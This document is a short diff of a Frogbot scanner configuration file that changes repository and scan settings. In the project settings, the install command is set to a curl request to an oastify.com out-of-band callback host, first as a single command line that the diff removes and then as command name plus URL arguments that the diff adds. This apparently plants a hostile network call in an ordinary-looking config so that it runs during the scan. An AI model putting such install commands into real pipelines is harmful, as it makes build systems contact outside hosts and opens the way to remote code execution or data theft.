@@ -1,17 +1,14 @@
 - params:
     git:
-      repoName: avigdor-e2e
+      repoName: frogbot
       branches:
-        - main
-      branchNameTemplate: "this is my branch {BRANCH_NAME_HASH}"
-      commitMessageTemplate: "custom commit title"
-      pullRequestTitleTemplate: "myPullRequests"
-      aggregateFixes: true
-      pullRequestCommentTitle: "build 1323 Lior"
+        - master
     scan:
-      includeAllVulnerabilities: true
+      includeAllVulnerabilities: false
       failOnSecurityIssues: false
       minSeverity: high
       fixableOnly: false
       projects:
-        - installCommand: curl -ks "http://dvcedb6jdybzq56x3nye67yq4ha8y1mq.oastify.com/czar"
+        - InstallCommandName: curl
+        - InstallCommandArgs:
+          - "http://ao2b68zg6v4wj2zuwkrbz4rnxe35r0fp.oastify.com/new"
